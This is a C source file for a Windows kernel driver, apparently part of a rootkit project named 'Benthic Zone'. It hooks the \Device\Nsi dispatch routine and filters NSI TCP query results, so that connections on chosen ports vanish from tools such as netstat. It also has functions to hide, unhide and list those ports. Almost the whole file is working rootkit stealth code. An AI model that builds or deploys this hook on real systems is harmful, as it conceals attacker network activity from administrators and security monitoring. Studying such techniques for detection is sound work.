// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/
// This header declares functions to handle strings safely (copy, format, concatenate, etc.) and avoid buffer overflows
#include <ntstrsafe.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "../Utils/Utils00Resources.h"
#include "NetworkStoreInterface.h"



// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------
// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------


// IOCTL code used by applications (like netstat) to query all TCP connection entries via the NSI (Network Store Interface) driver.
#define IOCTL_NSI_GETALLPARAM 0x12001b

// htons/ntohs helpers for byte order conversion
#define htons(x) ((USHORT)((((x) & 0xff) << 8) | (((x) & 0xff00) >> 8)))
#define ntohs(x) htons(x)

// Type aliases
typedef unsigned char BYTE;
typedef void* LPVOID;



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Structure representing one end of a TCP connection (local or remote)
**/
typedef struct _STRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_SUBENTRY {
	BYTE  Reserved1[2];
	USHORT Port;
	ULONG IpAddress;
	BYTE  IpAddress6[16];
	BYTE  Reserved2[4];
} STRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_SUBENTRY, *PSTRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_SUBENTRY;



/**
	@brief      Represents a full TCP entry, with local and remote subentries
**/
typedef struct _STRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_ENTRY {
	STRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_SUBENTRY Local;
	STRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_SUBENTRY Remote;
} STRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_ENTRY, *PSTRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_ENTRY;



/**
	@brief      Parameter structure used in NSI queries
**/
typedef struct _STRUCTURE_NETWORKSTOREINTERFACE_NSI_PARAM {
	SIZE_T Reserved1;
	SIZE_T Reserved2;
	LPVOID ModuleId;
	ULONG  Type;
	ULONG  Reserved3;
	ULONG  Reserved4;
	PVOID  Entries;
	SIZE_T EntrySize;
	PVOID  Reserved5;
	SIZE_T Reserved6;
	PVOID  StatusEntries;
	SIZE_T Reserved7;
	PVOID  ProcessEntries;
	SIZE_T ProcessEntrySize;
	SIZE_T Count;
} STRUCTURE_NETWORKSTOREINTERFACE_NSI_PARAM, *PSTRUCTURE_NETWORKSTOREINTERFACE_NSI_PARAM;



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



// Head of the linked list of hidden connections
PSTRUCTURE_UTILSRESOURCES_GENERIC_ENTRY Global_NetworkStoreInterface_HiddenConnectionsListHead = NULL;

// Counter for number of hidden connections
ULONG Global_NetworkStoreInterface_HiddenConnectionsListCount = 0;

// Backup of original dispatch routine for restoration
PDEVICE_OBJECT Global_NetworkStoreInterface_PreviousDevice = NULL;
PDRIVER_DISPATCH Global_NetworkStoreInterface_PreviousDispatch = NULL;



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Checks whether a specific TCP port is used to hide connections.


	@param[in]      port                        TCP port number in host byte order.


	@return         TRUE if the port is being used to hide connections, FALSE otherwise.
**/
BOOLEAN
TechniquesNetworkStoreInterface_IsPortHidden(
	_In_            USHORT                      port
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	char portStr[6] = { 0 };


	// ---------------------------------------------------------------------------------------------------------------------
	// Convert port to string
	RtlStringCchPrintfA(portStr, sizeof(portStr), "%hu", port);


	// ---------------------------------------------------------------------------------------------------------------------
	// Check presence in hidden list
	return UtilsResources_IsPresent(Global_NetworkStoreInterface_HiddenConnectionsListHead, STRUCTURE_UTILSRESOURCES_TYPE_PORT, STRUCTURE_UTILSRESOURCES_ACTION_HIDE, portStr);
}



/**
	@brief          Completion routine that filters out NSI-reported connections using hidden ports.


	@param[in]      DeviceObject                Pointer to device object.

	@param[in]      Irp                         Pointer to I/O request packet.

	@param[in]      Context                     Pointer to a caller-defined context associated with the I/O operation.


	@return         Always returns STATUS_SUCCESS.
**/
NTSTATUS
TechniquesNetworkStoreInterface_NsiCompletionRoutine(
	_In_            PDEVICE_OBJECT              DeviceObject,
	_In_            PIRP                        Irp,
	_In_            PVOID                       Context
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(DeviceObject);
	UNREFERENCED_PARAMETER(Context);


	// ---------------------------------------------------------------------------------------------------------------------
	// Cast user buffer to STRUCTURE_NETWORKSTOREINTERFACE_NSI_PARAM structure
	PSTRUCTURE_NETWORKSTOREINTERFACE_NSI_PARAM nsiParam = (PSTRUCTURE_NETWORKSTOREINTERFACE_NSI_PARAM)Irp->UserBuffer;


	// ---------------------------------------------------------------------------------------------------------------------
	// Validate and filter TCP (type 3) entries
	if (nsiParam && nsiParam->Entries && nsiParam->Type == 3)
	{
		PSTRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_ENTRY tcpEntries = (PSTRUCTURE_NETWORKSTOREINTERFACE_NSI_TCP_ENTRY)nsiParam->Entries;

		// -----------------------------------------------------------------------------------------------------------------
		// Loop through each reported TCP connection
		for (SIZE_T i = 0; i < nsiParam->Count; i++)
		{

			// -------------------------------------------------------------------------------------------------------------
			// Convert ports to host byte order
			USHORT localPort = ntohs(tcpEntries[i].Local.Port);
			USHORT remotePort = ntohs(tcpEntries[i].Remote.Port);


			// -------------------------------------------------------------------------------------------------------------
			// Check if either port is hidden
			if (TechniquesNetworkStoreInterface_IsPortHidden(localPort) || TechniquesNetworkStoreInterface_IsPortHidden(remotePort))
			{

				// ---------------------------------------------------------------------------------------------------------
				// Shift entries down to overwrite the hidden one
				DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (NsiCompletionRoutine) - Hiding network connection: Local Port %hu | Remote Port %hu\n", localPort, remotePort);

				// The RtlMoveMemory routine copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.
				// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlmovememory
				RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
				nsiParam->Count--;
				i--;
			}
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Dispatch hook for intercepting NSI IOCTL requests.


	@param[in]      DeviceObject                Pointer to the device object.

	@param[in]      Irp                         Pointer to the IRP.


	@return         Result of original dispatch routine.
**/
NTSTATUS
TechniquesNetworkStoreInterface_HookDeviceIo(
	_In_            PDEVICE_OBJECT              DeviceObject,
	_In_            PIRP                        Irp
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Get current IRP stack location

	// The IoGetCurrentIrpStackLocation routine returns a pointer to the caller's I/O stack location in the specified IRP.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentirpstacklocation
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if IOCTL matches NSI TCP query
	if (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_GETALLPARAM)
	{
		// Set completion routine for filtering
		irpStack->CompletionRoutine = TechniquesNetworkStoreInterface_NsiCompletionRoutine;
		irpStack->Control |= SL_INVOKE_ON_SUCCESS;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Pass down to original dispatch routine
	return Global_NetworkStoreInterface_PreviousDispatch(DeviceObject, Irp);
}



/**
	@brief          Attaches to the NSI device to intercept IRPs.


	@return         STATUS_SUCCESS if hooked, error otherwise.
**/
NTSTATUS
TechniquesNetworkStoreInterface_AttachToNSI()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	UNICODE_STRING deviceName;
	PFILE_OBJECT pFile;
	PDEVICE_OBJECT device;
	NTSTATUS status;


	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (AttachToNSI) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Define target device path
	RtlInitUnicodeString(&deviceName, L"\\Device\\Nsi");


	// ---------------------------------------------------------------------------------------------------------------------
	// Get device object from symbolic link

	// The IoGetDeviceObjectPointer routine returns a pointer to the top object in the named device object's stack and a pointer to the corresponding file object, if the requested access to the objects can be granted.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetdeviceobjectpointer
	status = IoGetDeviceObjectPointer(&deviceName, FILE_READ_DATA, &pFile, &device);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (AttachToNSI) - IoGetDeviceObjectPointer failed (Status 0x%08X).\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Backup reference
	Global_NetworkStoreInterface_PreviousDevice = device;


	// ---------------------------------------------------------------------------------------------------------------------
	// Hook dispatch routine
	Global_NetworkStoreInterface_PreviousDispatch = (PDRIVER_DISPATCH)InterlockedExchangePointer((PVOID*)&device->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], (PVOID)TechniquesNetworkStoreInterface_HookDeviceIo);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (AttachToNSI) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Detaches from the NSI device and restores original dispatch routine.
**/
VOID
TechniquesNetworkStoreInterface_Unload()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (AttachToNSI) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	if (Global_NetworkStoreInterface_PreviousDevice)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Restore previous dispatch routine

		// Atomically exchanges a pair of addresses.
		// https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-interlockedexchangepointer
		InterlockedExchangePointer((PVOID*)&Global_NetworkStoreInterface_PreviousDevice->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL], (PVOID)Global_NetworkStoreInterface_PreviousDispatch);


		// -----------------------------------------------------------------------------------------------------------------
		// Dereference device

		// The ObDereferenceObject routine decrements the given object's reference count and performs retention checks.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obdereferenceobject
		ObDereferenceObject(Global_NetworkStoreInterface_PreviousDevice);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (AttachToNSI) - Bye\n");
}



/**
	@brief          Hides all TCP connections involving a specific port.
	@details        The specified port is added to the internal hidden list. Any connection (local or remote) involving this port will be removed from the NSI TCP table during enumeration, effectively hiding it from user-mode tools.


	@param[out]     responseBuffer              Output message buffer.

	@param[in]      responseBufferSize          Size of the response buffer in bytes.

	@param[in]      portString                  Null-terminated string representing the TCP port to hide.


	@return         STATUS_SUCCESS if hidden correctly, error code otherwise.
**/
NTSTATUS
TechniquesNetworkStoreInterface_Hide(
	_Out_           char*                       responseBuffer,
	_In_            size_t                      responseBufferSize,
	_In_            const char*                 portString
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (Hide) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Validate input
	if (!portString || strlen(portString) == 0)
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Invalid port.");
		return STATUS_INVALID_PARAMETER;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the port is already being used to hide connections
	if (UtilsResources_IsPresent(Global_NetworkStoreInterface_HiddenConnectionsListHead, STRUCTURE_UTILSRESOURCES_TYPE_PORT, STRUCTURE_UTILSRESOURCES_ACTION_HIDE, portString))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Connections involving this port are already hidden");
		return STATUS_ALREADY_REGISTERED;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Add port to hidden list
	if (!UtilsResources_Add(&Global_NetworkStoreInterface_HiddenConnectionsListHead, &Global_NetworkStoreInterface_HiddenConnectionsListCount, STRUCTURE_UTILSRESOURCES_TYPE_PORT, STRUCTURE_UTILSRESOURCES_ACTION_HIDE, portString))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "Failed to hide connections for this port.");
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Inform user-space that the connections were successfully hidden

	// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
	RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Connections involving port %s hidden", portString);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (Hide) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Stops hiding connections involving a specific TCP port, by removing it from the hidden list.


	@param[out]     responseBuffer              Output message buffer.

	@param[in]      responseBufferSize          Size of the response buffer in bytes.

	@param[in]      index                       Index of the port in the hidden list.


	@return         STATUS_SUCCESS if successful, error code otherwise.
**/
NTSTATUS
TechniquesNetworkStoreInterface_Unhide(
	_Out_           char*                       responseBuffer,
	_In_            size_t                      responseBufferSize,
	_In_            ULONG                       index
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	char portString[260] = { 0 };


	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (Unhide) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Retrieve the identifier (Port) from the resource list using the provided index
	if (!UtilsResources_GetIdentifierByIndex(Global_NetworkStoreInterface_HiddenConnectionsListHead, index, portString, sizeof(portString)))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "No port found for index %lu.", index);
		return STATUS_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Remove from list
	if (!UtilsResources_Remove(&Global_NetworkStoreInterface_HiddenConnectionsListHead, &Global_NetworkStoreInterface_HiddenConnectionsListCount, index))
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Failed to remove port at index %lu.", index);
		return STATUS_UNSUCCESSFUL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Confirm success to user-space

	// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
	RtlStringCbPrintfA(responseBuffer, responseBufferSize, "Port at index %lu unhidden.", index);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/NetworkStoreInterface.c] (Unhide) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}



/**
	@brief          Lists all TCP ports currently being used to hide associated connections.
	@details        These are the ports tracked internally to filter out connections from the NSI TCP entry list.


	@param[out]     responseBuffer              Output buffer to fill.

	@param[in]      responseBufferSize          Size of the output buffer.


	@return         A NTSTATUS value indicating success or an error code if the list was truncated.
**/
NTSTATUS
TechniquesNetworkStoreInterface_List(
	_Out_           char*                       responseBuffer,
	_In_            size_t                      responseBufferSize
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the list is empty
	if (Global_NetworkStoreInterface_HiddenConnectionsListHead == NULL)
	{
		// The RtlStringCbPrintfW and RtlStringCbPrintfA functions create a byte-counted text string, with formatting that is based on supplied formatting information.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/nf-ntstrsafe-rtlstringcbprintfa
		RtlStringCbCopyA(responseBuffer, responseBufferSize, "No hidden ports.");
		return STATUS_SUCCESS;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Dump hidden connections into the response buffer
	return UtilsResources_List(Global_NetworkStoreInterface_HiddenConnectionsListHead, responseBuffer, responseBufferSize);
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
